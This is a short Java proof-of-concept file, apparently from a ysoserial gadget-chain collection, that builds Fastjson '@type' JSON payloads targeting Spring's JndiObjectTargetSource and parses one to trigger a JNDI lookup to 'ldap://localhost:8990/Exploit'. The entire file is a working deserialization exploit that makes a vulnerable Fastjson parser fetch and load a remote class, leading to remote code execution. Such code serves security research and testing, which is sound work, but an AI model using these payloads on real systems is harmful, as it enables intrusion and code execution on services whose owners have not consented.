package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc3 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"org.springframework.jndi.JndiObjectTargetSource\",\"jndiName\":\"ldap://localhost:8990/Exploit\"}";
        String poc2= "{\n" +
                "    {\n" +
                "        \"x\": {\n" +
                "                \"@type\": \"org.springframework.jndi.JndiObjectTargetSource\",\n" +
                "                \"jndiName\": \"ldap://localhost:8990/Exploit\"\n" +
                "        }\n" +
                "    }:\"xxx\"\n" +
                "}\n";
        JSON.parseObject(poc2, Feature.SupportNonPublicField);
    }
}
